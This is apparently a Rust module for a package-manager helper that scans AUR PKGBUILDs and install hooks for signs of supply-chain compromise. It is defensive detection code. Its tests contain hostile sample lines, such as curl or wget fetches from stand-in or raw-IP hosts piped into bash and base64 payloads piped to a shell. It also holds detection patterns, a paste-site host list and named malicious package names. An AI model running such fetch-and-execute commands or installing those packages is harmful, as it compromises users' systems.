//! AUR PKGBUILD safety scanner.
//!
//! Runs automatically before every AUR install: fetches each package's raw
//! PKGBUILD from the AUR cgit mirror and greps for common red-flag patterns
//! seen in malicious/compromised PKGBUILDs. Not a substitute for reading it
//! yourself — just a cheap tripwire against obvious tricks. On any hit,
//! install is blocked until the user types an explicit "y".

use colored::Colorize;
use std::io::{self, Write};
use std::process::{Command, Stdio};

use crate::*;

// ── AUR PKGBUILD safety scanner ─────────────────────────────────────────────
//
// Runs automatically before every AUR install. Fetches each package's raw
// PKGBUILD from the AUR cgit mirror and greps for common red-flag patterns
// seen in malicious/compromised PKGBUILDs. Not a substitute for reading it
// yourself — just a cheap tripwire against obvious tricks.
//
// On any hit, install is blocked until the user types an explicit "y".

const CURL_BIN: &str = "/usr/bin/curl";

/// Download a raw file from a package's AUR git tree via cgit (e.g.
/// "PKGBUILD" or a referenced ".install" hook). Returns None on any
/// failure — callers should treat that as "nothing to check", not clean.
pub(crate) fn fetch_aur_file(pkg: &str, filename: &str) -> Option<String> {
    let url = format!(
        "https://aur.archlinux.org/cgit/aur.git/plain/{}?h={}",
        filename, pkg
    );
    let output = Command::new(CURL_BIN)
        .args(["-sfL", "--max-time", "10", &url])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout).to_string();
    if text.trim().is_empty() {
        None
    } else {
        Some(text)
    }
}

pub(crate) fn fetch_aur_pkgbuild(pkg: &str) -> Option<String> {
    fetch_aur_file(pkg, "PKGBUILD")
}

/// Extract the `.install` hook filename from a PKGBUILD's `install=`
/// variable. Runs as root as part of the pacman transaction, so it's a
/// sensitive execution point (used in the June 2026 "Atomic Arch" campaign).
pub(crate) fn parse_install_filename(pkgbuild_text: &str) -> Option<String> {
    for line in pkgbuild_text.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        if let Some(rest) = l.strip_prefix("install=") {
            let name = rest.trim().trim_matches('\'').trim_matches('"');
            if !name.is_empty() {
                return Some(name.to_string());
            }
        }
    }
    None
}

/// `curl ... | sh` / `wget ... | bash` / `... | source` style remote-code-exec
/// pipelines. Deliberately loose (matches curl/wget followed eventually by a
/// pipe into a shell) since attackers vary whitespace and flags constantly.
pub(crate) fn curl_pipe_shell_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_fetcher = lower.contains("curl ") || lower.contains("curl\t")
        || lower.contains("wget ") || lower.contains("wget\t");
    if !has_fetcher || !lower.contains('|') {
        return false;
    }
    let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("");
    ["sh", "bash", "zsh", "source", "."].iter().any(|shell| {
        after_pipe.split_whitespace().next() == Some(shell)
    })
}

#[cfg(test)]
pub(crate) fn is_curl_pipe_shell(source: &str) -> bool {
    source.lines().any(curl_pipe_shell_line)
}

/// Same check as `is_curl_pipe_shell`, but returns the 1-indexed line
/// number of the first match instead of a bare bool, so alert output can
/// point at the exact offending line.
pub(crate) fn line_of_curl_pipe_shell(source: &str) -> Option<usize> {
    source.lines().position(curl_pipe_shell_line).map(|i| i + 1)
}

/// `base64 -d` / `base64 --decode` — near-universal marker of obfuscated
/// payloads stashed in a PKGBUILD (legit PKGBUILDs essentially never need
/// this).
pub(crate) fn base64_decode_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("base64 -d") || lower.contains("base64 --decode")
        || lower.contains("base64 -D")
}

#[cfg(test)]
pub(crate) fn is_base64_decode(source: &str) -> bool {
    source.lines().any(base64_decode_line)
}

pub(crate) fn line_of_base64_decode(source: &str) -> Option<usize> {
    source.lines().position(base64_decode_line).map(|i| i + 1)
}

/// `chmod 777` / `chmod -R 777` (and equivalent a+rwx) — overly permissive
/// perms with no legitimate reason to appear in a build script.
pub(crate) fn chmod_777_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("chmod") && (lower.contains("777") || lower.contains("a+rwx"))
}

#[cfg(test)]
pub(crate) fn is_chmod_777(source: &str) -> bool {
    source.lines().any(chmod_777_line)
}

pub(crate) fn line_of_chmod_777(source: &str) -> Option<usize> {
    source.lines().position(chmod_777_line).map(|i| i + 1)
}

/// A bare dotted-quad IPv4 literal anywhere in the file — legit PKGBUILDs
/// fetch from named domains, not hardcoded IPs. Heuristic: 4 dot-separated
/// 1-3 digit groups <= 255, not adjacent to other digits/dots.
///
/// Known false positive: a 4-component version string like "1.2.3.4" is
/// indistinguishable from an IP here. Acceptable since this only prompts
/// a review, not a hard failure.
pub(crate) fn line_has_raw_ipv4(source: &str) -> bool {
    let bytes = source.as_bytes();
    let is_boundary = |c: Option<u8>| !matches!(c, Some(b) if b.is_ascii_digit() || b == b'.');

    let chars: Vec<char> = source.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        if chars[i].is_ascii_digit() {
            let start = i;
            let mut j = i;
            let mut octets = 0;
            let mut ok = true;
            loop {
                let mut k = j;
                while k < n && chars[k].is_ascii_digit() && k - j < 3 {
                    k += 1;
                }
                if k == j {
                    ok = false;
                    break;
                }
                let octet: u32 = chars[j..k].iter().collect::<String>().parse().unwrap_or(999);
                if octet > 255 {
                    ok = false;
                    break;
                }
                octets += 1;
                j = k;
                if octets == 4 {
                    break;
                }
                if j < n && chars[j] == '.' {
                    j += 1;
                } else {
                    ok = false;
                    break;
                }
            }
            if ok && octets == 4 {
                let before_ok = is_boundary(bytes.get(start.wrapping_sub(1)).copied().filter(|_| start > 0));
                let after_ok = is_boundary(chars.get(j).map(|c| *c as u8));
                let before_ok = start == 0 || before_ok;
                if before_ok && after_ok {
                    return true;
                }
            }
            i = start + 1;
        } else {
            i += 1;
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn contains_raw_ipv4(source: &str) -> bool {
    source.lines().any(line_has_raw_ipv4)
}

pub(crate) fn line_of_raw_ipv4(source: &str) -> Option<usize> {
    source.lines().position(line_has_raw_ipv4).map(|i| i + 1)
}

/// A run of `\xHH` hex-escape sequences long enough to be an encoded
/// payload (e.g. shellcode) fed to `printf`/`echo -e`. Keyed on `\x`
/// escapes specifically, not bare hex, since bare hex is common in
/// legit PKGBUILDs (checksums, PGP fingerprints, commit hashes).
pub(crate) fn hex_escape_payload_line(line: &str) -> bool {
    const THRESHOLD: usize = 8; // consecutive \xHH escapes in one line
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let bytes = l.as_bytes();
    let mut i = 0;
    let mut run = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 3 < bytes.len() && (bytes[i + 1] == b'x' || bytes[i + 1] == b'X')
            && bytes[i + 2].is_ascii_hexdigit() && bytes[i + 3].is_ascii_hexdigit()
        {
            run += 1;
            if run >= THRESHOLD {
                return true;
            }
            i += 4;
        } else {
            run = 0;
            i += 1;
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn is_hex_escape_payload(source: &str) -> bool {
    source.lines().any(hex_escape_payload_line)
}

pub(crate) fn line_of_hex_escape_payload(source: &str) -> Option<usize> {
    source.lines().position(hex_escape_payload_line).map(|i| i + 1)
}

/// A download/fetch aimed at a paste-dump site rather than a proper
/// release/source host. Legitimate PKGBUILDs essentially never pull build
/// inputs from a paste site; historically this is exactly how the 2018
/// acroread/balz/minergate AUR takeover staged its payload — a `curl`
/// straight to a Pastebin raw URL, piped into the persistence script.
/// Distinct from the generic curl-pipe-shell check: this fires even when
/// the fetched content isn't piped directly into a shell on the same line
/// (e.g. saved to a file and `source`d or `exec`'d later).
pub(crate) fn paste_site_fetch_line(line: &str) -> bool {
    const HOSTS: &[&str] = &[
        "pastebin.com/raw", "hastebin.com/raw", "hastebin.com/share",
        "dpaste.com", "dpaste.org", "ix.io", "0x0.st", "transfer.sh",
        "paste.ee", "termbin.com",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    if !(lower.contains("curl") || lower.contains("wget")) {
        return false;
    }
    HOSTS.iter().any(|h| lower.contains(h))
}

#[cfg(test)]
pub(crate) fn is_paste_site_fetch(source: &str) -> bool {
    source.lines().any(paste_site_fetch_line)
}

pub(crate) fn line_of_paste_site_fetch(source: &str) -> Option<usize> {
    source.lines().position(paste_site_fetch_line).map(|i| i + 1)
}

/// Exact filesystem artifact from the 2018 acroread/balz/minergate AUR
/// takeover: the injected script dropped a literal `compromised.txt`
/// marker file into `/` and every home directory. A PKGBUILD/.install
/// hook referencing that exact filename has no legitimate reason to.
pub(crate) fn compromised_marker_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    l.contains("compromised.txt")
}

#[cfg(test)]
pub(crate) fn has_compromised_marker(source: &str) -> bool {
    source.lines().any(compromised_marker_line)
}

pub(crate) fn line_of_compromised_marker(source: &str) -> Option<usize> {
    source.lines().position(compromised_marker_line).map(|i| i + 1)
}

/// Exact indicators from known, still-circulating AUR supply-chain
/// campaigns. Will go stale as campaigns rotate names, but it's a
/// zero-cost, high-confidence check when it does fire.
///
/// Background: the "Atomic Arch" campaign (disclosed June 11-12, 2026)
/// adopted 400+ orphaned AUR packages and edited PKGBUILD/`.install`
/// hooks to pull in an infostealer via npm/bun during the build.
const KNOWN_MALICIOUS_PACKAGE_NAMES: &[&str] = &["atomic-lockfile", "js-digest", "lockfile-js"];

#[cfg(test)]
pub(crate) fn contains_known_malicious_package(source: &str) -> Option<&'static str> {
    KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|name| source.contains(name))
}

/// Same check, but returns the 1-indexed line number of the first match
/// alongside the matched name, so alert output can point at the exact line.
pub(crate) fn line_of_known_malicious_package(source: &str) -> Option<(usize, &'static str)> {
    for (i, line) in source.lines().enumerate() {
        if let Some(name) = KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|n| line.contains(n)) {
            return Some((i + 1, name));
        }
    }
    None
}

/// `npm install <pkg>` / `bun add <pkg>` / `pip install <pkg>` etc. naming
/// a specific external package — as opposed to a bare `npm ci`, which just
/// installs a project's own declared deps and is common/legitimate. Pulling
/// a named package mid-build is exactly the Atomic Arch mechanism. Known
/// false positive: legit installs of a global CLI tool this way also flag —
/// acceptable since it only costs a review prompt, never a hard block.
pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
    const PATTERNS: &[&str] = &[
        "npm install ", "npm i ", "bun install ", "bun add ",
        "yarn add ", "pip install ", "pip3 install ", "gem install ",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    for p in PATTERNS {
        if let Some(idx) = lower.find(p) {
            let rest = &l[idx + p.len()..];
            let first_pkg_tok = rest.split_whitespace().find(|t| !t.starts_with('-'));
            if let Some(tok) = first_pkg_tok {
                if !tok.starts_with('.') && !tok.starts_with('/') {
                    return true;
                }
            }
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn is_foreign_pkg_manager_install(source: &str) -> bool {
    source.lines().any(foreign_pkg_manager_install_line)
}

pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
    source.lines().position(foreign_pkg_manager_install_line).map(|i| i + 1)
}

/// How confident a finding is. `Suspicious` covers generic, crude-but-common
/// heuristics (curl|sh, base64 -d, chmod 777, raw IP, hex-escape payload) —
/// each a real reason to look twice but each with plausible false positives.
/// `ConfirmedIoc` is reserved for an exact-match indicator of compromise
/// against a specific, disclosed AUR supply-chain campaign (e.g. Atomic
/// Arch/June 2026, or the 2018 acroread/balz/minergate takeover), with
/// essentially no false-positive risk, so it gets a louder alert. The
/// specific campaign is always named in the finding's own message.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum Severity {
    Suspicious,
    ConfirmedIoc,
}

#[derive(Clone, Debug)]
pub(crate) struct Finding {
    /// 1-indexed line number the pattern matched on; 0 if not line-specific.
    line: usize,
    message: String,
    severity: Severity,
}

/// Run all heuristics against one PKGBUILD (or `.install` hook — same
/// shell-script surface, same heuristics apply), returning line-numbered,
/// severity-tagged findings (empty vec = clean).
pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Some(line) = line_of_curl_pipe_shell(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)".to_string(),
        });
    }
    if let Some(line) = line_of_base64_decode(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decodes a base64 blob (possible obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_chmod_777(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "sets world-writable/executable permissions (chmod 777)".to_string(),
        });
    }
    if let Some(line) = line_of_raw_ipv4(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from or references a hardcoded raw IP address instead of a domain".to_string(),
        });
    }
    if let Some(line) = line_of_hex_escape_payload(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "contains a long run of \\xHH hex-escape sequences (possible encoded/obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_paste_site_fetch(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from a paste-dump site (pastebin/hastebin/dpaste/ix.io/...) — the delivery mechanism used by the 2018 acroread/balz/minergate AUR takeover".to_string(),
        });
    }
    if let Some(line) = line_of_compromised_marker(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: "references 'compromised.txt' — the exact marker file dropped by the 2018 acroread/balz/minergate AUR takeover".to_string(),
        });
    }
    if let Some((line, name)) = line_of_known_malicious_package(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: format!(
                "references '{}' — a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
                name
            ),
        });
    }
    if let Some(line) = line_of_foreign_pkg_manager_install(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "installs a named external package via npm/bun/yarn/pip/gem mid-build — the mechanism the Atomic Arch AUR campaign used to smuggle in its payload".to_string(),
        });
    }
    findings
}

/// Fetch + scan the PKGBUILD (and any referenced `.install` hook) for
/// every package about to be installed from the AUR. On any finding,
/// print it and require an explicit "y" to continue; anything else aborts.
///
/// Files that couldn't be fetched are silently skipped, not treated as a
/// hit — this only adds friction on actual findings, never on lookup failures.
pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
    let mut any_findings = false;
    println!("{} Scanning AUR PKGBUILDs and .install hooks for suspicious patterns...", ">>>".green().bold());

    for pkg in pkgs {
        let pkgbuild_src = match fetch_aur_pkgbuild(pkg) {
            Some(s) => s,
            None => continue,
        };

        // (file label, Finding) pairs across both PKGBUILD and, if present,
        // the referenced .install hook.
        let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(&pkgbuild_src)
            .into_iter()
            .map(|f| ("PKGBUILD".to_string(), f))
            .collect();

        if let Some(install_name) = parse_install_filename(&pkgbuild_src) {
            if let Some(install_src) = fetch_aur_file(pkg, &install_name) {
                pkg_findings.extend(
                    scan_pkgbuild_source(&install_src)
                        .into_iter()
                        .map(|f| (install_name.clone(), f)),
                );
            }
        }

        if pkg_findings.is_empty() {
            continue;
        }
        any_findings = true;

        let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
            .collect();
        let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::Suspicious)
            .collect();

        // Highest-confidence alert first: a confirmed IOC match against a
        // disclosed campaign is more actionable than a generic heuristic.
        // The specific campaign is named in each finding's own message.
        if !atomic.is_empty() {
            print_finding_block(pkg, "Alert, matched a known-malicious IOC", &atomic, true);
        }
        if !suspicious.is_empty() {
            print_finding_block(pkg, "Warning, detected suspicious fragment", &suspicious, false);
        }
    }

    if !any_findings {
        return;
    }

    eprintln!();
    eprintln!(
        "{} One or more AUR packages have PKGBUILD/.install content matching \
        known-suspicious patterns. Review them yourself before proceeding:",
        ">>>".red().bold()
    );
    for pkg in pkgs {
        eprintln!("    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}", pkg);
    }
    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
    io::stderr().flush().ok();

    let answer = read_line_raw();
    let confirmed = answer.trim().eq_ignore_ascii_case("y");

    if !confirmed {
        eprintln!("{} Aborted.", ">>>".red().bold());
        std::process::exit(1);
    }
}

/// Print one alert block in the emerge-style `>>> ===...` box.
///
/// `is_atomic` picks the color scheme: `true` (a confirmed IOC match
/// against a disclosed campaign, near-zero false-positive risk) uses
/// red/orange for a louder alert; `false` (generic heuristic hit) uses
/// yellow throughout.
///
/// Each finding line names the file and line it fired on; the block ends
/// with a direct cgit link per referenced file so the user can jump straight to it.
pub(crate) fn print_finding_block(pkg: &str, headline: &str, findings: &[&(String, Finding)], is_atomic: bool) {
    let bar = "===================================";
    let arrow_str = ">>>";

    eprintln!();
    if is_atomic {
        eprintln!("{} {}", arrow_str.red().bold(), bar.truecolor(255, 140, 0).bold());
        eprintln!("{} {}", arrow_str.red().bold(), format!("{} ({})", headline, pkg).yellow().bold());
        eprintln!("{} {}", arrow_str.red().bold(), bar.truecolor(255, 140, 0).bold());
    } else {
        eprintln!("{} {}", arrow_str.yellow().bold(), bar.yellow().bold());
        eprintln!("{} {}", arrow_str.yellow().bold(), format!("{} ({})", headline, pkg).yellow().bold());
        eprintln!("{} {}", arrow_str.yellow().bold(), bar.yellow().bold());
    }

    let arrow = || if is_atomic { arrow_str.truecolor(255, 140, 0).bold() } else { arrow_str.yellow().bold() };

    let mut files_seen: Vec<&str> = Vec::new();
    for (file, finding) in findings {
        let loc = if finding.line > 0 {
            format!("file {} line {}", file, finding.line)
        } else {
            format!("file {}", file)
        };
        eprintln!("{} {}: {}", arrow(), loc, finding.message);
        if !files_seen.contains(&file.as_str()) {
            files_seen.push(file.as_str());
        }
    }

    for file in files_seen {
        let anchor = findings.iter()
            .find(|(f, fi)| f == file && fi.line > 0)
            .map(|(_, fi)| format!("#n{}", fi.line))
            .unwrap_or_default();
        eprintln!(
            "{} Read full file: https://aur.archlinux.org/cgit/aur.git/tree/{}?h={}{}",
            arrow(), file, pkg, anchor
        );
    }
}

#[cfg(test)]
mod scanner_tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_detected() {
        assert!(is_curl_pipe_shell("curl -sSL https://evil.example.com/x | sh"));
        assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
        assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
    }

    #[test]
    fn base64_decode_detected() {
        assert!(is_base64_decode("echo $PAYLOAD | base64 -d | bash"));
        assert!(is_base64_decode("base64 --decode < blob.txt > out"));
        assert!(!is_base64_decode("makepkg --version"));
    }

    #[test]
    fn chmod_777_detected() {
        assert!(is_chmod_777("chmod 777 \"$pkgdir/usr/bin/foo\""));
        assert!(is_chmod_777("chmod -R 777 build/"));
        assert!(!is_chmod_777("chmod 755 \"$pkgdir/usr/bin/foo\""));
    }

    #[test]
    fn raw_ipv4_detected() {
        assert!(contains_raw_ipv4("source=(\"http://185.220.101.5/payload.sh\")"));
        assert!(contains_raw_ipv4("192.168.1.1"));
        assert!(!contains_raw_ipv4("source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"));
        assert!(!contains_raw_ipv4("no ip here at all"));
        // Known false positive, documented on contains_raw_ipv4: a 4-part
        // dotted version where every part is <= 255 reads as an IP too.
        assert!(contains_raw_ipv4("pkgver=1.2.3.4"));
    }

    #[test]
    fn clean_pkgbuild_has_no_findings() {
        let src = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
        assert!(scan_pkgbuild_source(src).is_empty());
    }

    #[test]
    fn validpgpkeys_single_line() {
        let src = "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')";
        assert_eq!(parse_validpgpkeys(src), vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]);
    }

    #[test]
    fn validpgpkeys_multi_line_mixed_quotes() {
        let src = "validpgpkeys=('AAAA0123456789ABCDEF0123456789ABCDEF0123'\n              \"BBBB0123456789ABCDEF0123456789ABCDEF0123\")\n";
        assert_eq!(
            parse_validpgpkeys(src),
            vec![
                "AAAA0123456789ABCDEF0123456789ABCDEF0123",
                "BBBB0123456789ABCDEF0123456789ABCDEF0123"
            ]
        );
    }

    #[test]
    fn validpgpkeys_absent() {
        assert!(parse_validpgpkeys("pkgname=foo\npkgver=1.0\n").is_empty());
    }

    #[test]
    fn known_malicious_package_detected() {
        assert_eq!(
            contains_known_malicious_package("npm install atomic-lockfile"),
            Some("atomic-lockfile")
        );
        assert_eq!(
            contains_known_malicious_package("bun install js-digest"),
            Some("js-digest")
        );
        assert_eq!(contains_known_malicious_package("npm install typescript"), None);
    }

    #[test]
    fn foreign_pkg_manager_install_detected() {
        assert!(is_foreign_pkg_manager_install("npm install atomic-lockfile"));
        assert!(is_foreign_pkg_manager_install("bun add js-digest"));
        assert!(is_foreign_pkg_manager_install("pip install requests"));
        // Local/project installs — no named external package — must NOT flag.
        assert!(!is_foreign_pkg_manager_install("npm install"));
        assert!(!is_foreign_pkg_manager_install("npm ci"));
        assert!(!is_foreign_pkg_manager_install("npm install ."));
        assert!(!is_foreign_pkg_manager_install("npm install --production"));
        assert!(!is_foreign_pkg_manager_install("yarn add ./vendor/local-pkg"));
    }

    #[test]
    fn parse_install_filename_variants() {
        assert_eq!(
            parse_install_filename("pkgname=foo\ninstall=foo.install\npkgver=1.0"),
            Some("foo.install".to_string())
        );
        assert_eq!(
            parse_install_filename("install='foo.install'"),
            Some("foo.install".to_string())
        );
        assert_eq!(parse_install_filename("# install=foo.install"), None);
        assert_eq!(parse_install_filename("pkgname=foo\npkgver=1.0"), None);
    }

    #[test]
    fn hex_escape_payload_detected() {
        assert!(is_hex_escape_payload(
            r#"printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' > /tmp/x"#
        ));
        // Legitimate hex doesn't use \x escapes: checksums, fingerprints, hashes.
        assert!(!is_hex_escape_payload(
            "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
        ));
        assert!(!is_hex_escape_payload(
            "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')"
        ));
        assert!(!is_hex_escape_payload("commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"));
        // A couple of stray \x escapes (e.g. one ANSI color code) shouldn't trip it.
        assert!(!is_hex_escape_payload(r#"echo -e '\x1b[32mgreen\x1b[0m'"#));
    }

    #[test]
    fn strip_version_operator_variants() {
        assert_eq!(strip_version_operator("glibc>=2.38"), "glibc");
        assert_eq!(strip_version_operator("libc.so=6-64"), "libc.so");
        assert_eq!(strip_version_operator("bash"), "bash");
        assert_eq!(strip_version_operator("foo<=1.2"), "foo");
        assert_eq!(strip_version_operator("foo<1.2"), "foo");
    }

    #[test]
    fn parse_depends_on_basic() {
        let qi = "\
Name            : bash
Version         : 5.2.32-1
Description     : The GNU Bourne Again shell
Depends On      : readline  libc.so=6-64
Optional Deps   : None
Required By     : filesystem

Name            : coreutils
Version         : 9.5-1
Depends On      : glibc>=2.38  acl  attr
Required By     : base

Name            : filesystem
Version         : 2024.01-1
Depends On      : None
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["readline", "libc.so", "glibc", "acl", "attr"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_wrapped_continuation() {
        // Simulates pacman wrapping a long Depends On value onto a second,
        // indented line with no field label.
        let qi = "\
Name            : bigpkg
Version         : 1.0-1
Depends On      : dep-one  dep-two  dep-three
                  dep-four  dep-five
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["dep-one", "dep-two", "dep-three", "dep-four", "dep-five"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_none_and_missing_field() {
        let qi = "\
Name            : justapkg
Version         : 1.0-1
Depends On      : None
Required By     : None
";
        assert!(parse_depends_on_all(qi).is_empty());
    }

    #[test]
    fn atomic_arch_style_pkgbuild_and_install_flagged() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=totally-legit-tool.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
        let install_hook = r#"
post_install() {
  npm install atomic-lockfile
}
"#;
        let pkgbuild_findings = scan_pkgbuild_source(pkgbuild);
        assert!(pkgbuild_findings.is_empty(), "clean PKGBUILD should have no findings on its own");

        assert_eq!(parse_install_filename(pkgbuild), Some("totally-legit-tool.install".to_string()));

        let install_findings = scan_pkgbuild_source(install_hook);
        assert!(install_findings.iter().any(|f| f.message.contains("atomic-lockfile")));
        assert!(install_findings.iter().any(|f| f.severity == Severity::ConfirmedIoc));
    }

    #[test]
    fn findings_carry_correct_line_numbers() {
        let src = "pkgname=foo\npkgver=1.0\nbuild() {\n  chmod 777 \"$pkgdir\"\n}\n";
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].line, 4);
        assert_eq!(findings[0].severity, Severity::Suspicious);
    }

    #[test]
    fn known_malicious_package_is_atomic_arch_severity() {
        let src = "post_install() {\n  npm install atomic-lockfile\n}\n";
        let findings = scan_pkgbuild_source(src);
        // Hits both the exact-IOC check (AtomicArch) and the generic
        // foreign-package-manager heuristic (Suspicious) on the same line.
        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious && f.line == 2));
    }

    #[test]
    fn malicious_pkgbuild_flagged() {
        let src = r#"
pkgname=evil
build() {
  curl -sSL http://185.220.101.5/stage2.sh | bash
  chmod 777 /tmp/evil
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 3);
    }

    // ── 2018 acroread/balz/minergate takeover ───────────────────────────
    //
    // Real incident: a hijacked orphaned AUR package fetched a persistence
    // script from a Pastebin raw URL and, once run, dropped a literal
    // `compromised.txt` marker into every home directory. Covered here by
    // two independent heuristics: the paste-site fetch (Suspicious, since
    // the mechanism alone has some legitimate uses) and the marker
    // filename itself (ConfirmedIoc, since there's no legitimate reason
    // for a PKGBUILD to reference it at all).

    #[test]
    fn paste_site_fetch_detected() {
        assert!(is_paste_site_fetch("curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"));
        assert!(is_paste_site_fetch("wget -qO- https://ix.io/abcd | bash"));
        assert!(is_paste_site_fetch("curl https://0x0.st/xyz.sh"));
        assert!(!is_paste_site_fetch("curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"));
        assert!(!is_paste_site_fetch("# curl https://pastebin.com/raw/AbCd1234 (just a comment)"));
        // Mentioning a paste site without an actual fetch verb shouldn't fire.
        assert!(!is_paste_site_fetch("# see https://pastebin.com/raw/AbCd1234 for context"));
    }

    #[test]
    fn compromised_marker_detected() {
        assert!(has_compromised_marker("touch /compromised.txt"));
        assert!(has_compromised_marker("echo pwned > \"$HOME/compromised.txt\""));
        assert!(!has_compromised_marker("# compromised.txt was the 2018 marker file (comment only)"));
        assert!(!has_compromised_marker("this file is totally fine"));
    }

    #[test]
    fn acroread_2018_style_pkgbuild_flagged() {
        // Reconstructed shape of the real 2018 payload: fetch a script off
        // Pastebin and pipe it into the shell, which then drops the marker
        // file. Should trip curl-pipe-shell (Suspicious), paste-site-fetch
        // (Suspicious), and — since the marker also happens to appear in
        // this build() — the exact-IOC check (ConfirmedIoc).
        let src = r#"
pkgname=acroread
build() {
  curl -sSL https://pastebin.com/raw/deadbeef | bash
  echo pwned > /compromised.txt
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc
            && f.message.contains("compromised.txt")));
        assert!(findings.iter().any(|f| f.message.contains("paste-dump site")));
        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
    }
}